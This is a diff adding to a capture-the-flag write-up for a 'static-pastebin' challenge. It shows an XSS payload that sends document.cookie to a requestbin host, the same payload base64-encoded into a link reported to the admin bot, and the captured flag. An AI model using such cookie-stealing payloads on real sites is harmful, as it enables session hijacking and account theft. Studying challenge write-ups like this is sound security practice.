@@ -70,3 +70,17 @@ Reading this code i understood two important things , first of all the value fro
 test"><img src=x onerror=alert("22");>
 ```
 ![Test](https://user-images.githubusercontent.com/59454895/85903016-a45b1000-b805-11ea-8b64-ee6ca162333f.PNG)
+
+Now that I know it works locally I modified my payload in this way :  ```javascript test"><img src=x onerror=window.location.href='https://en96oi0edd3dm.x.pipedream.net/?a='+document.cookie;>``` . I used a requestbin to intercept the admin's cookies.
+
+
+Now the admin needs to visit the link or we can't intercept his cookie, so I encoded all my payload in base 64 and i inserted it in the link with this way :
+
+https://static-pastebin.2020.redpwnc.tf/paste/#dGVzdCI+PGltZyBzcmM9eCBvbmVycm9yPXdpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwczovL2VuOTZvaTBlZGQzZG0ueC5waXBlZHJlYW0ubmV0Lz9hPScrZG9jdW1lbnQuY29va2llOz4=
+
+The final step was to report this entire link to the admin and see the requestbin to see if there was the flag :
+
+![FlagStaticBin](https://user-images.githubusercontent.com/59454895/85904268-87740c00-b808-11ea-8c5e-bf24dc24d7a4.PNG)
+
+Flag: flag{54n1t1z4t10n_k1nd4_h4rd}
+
